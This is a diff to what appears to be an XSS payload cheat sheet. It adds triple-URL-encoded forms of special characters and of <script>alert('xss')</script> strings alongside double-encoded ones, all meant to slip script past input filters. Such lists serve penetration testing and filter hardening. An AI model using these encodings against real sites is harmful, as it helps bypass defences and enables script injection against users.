@@ -1,4 +1,4 @@
-double/triple encoding
+double Encoding
 < = %253C
 > = %253E
 / = %252F
@@ -6,7 +6,20 @@ double/triple encoding
 ) = %2529
 ; = %253B
 ' = %2527
+
+Triple Encoding
+< = %25253C
+> = %25253E
+/ = %25252F
+( = %252528
+) = %252529
+; = %25253B
+' = %252527
+
 Double Encoded Below
 <script>alert('xss')</script> = %253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E
 <script>alert('xss');</script> = %253Cscript%253Ealert%2528%2527xss%2527%2529%253B%253C%252Fscript%253E
+
 Triple Encoded Below
+<script>alert('xss')</script> = %25253Cscript%25253Ealert%252528%252527xss%252527%252529%25253C%25252Fscript%25253E
+<script>alert('xss');</script> = %25253Cscript%25253Ealert%252528%252527xss%252527%252529%25253B%25253C%25252Fscript%25253E
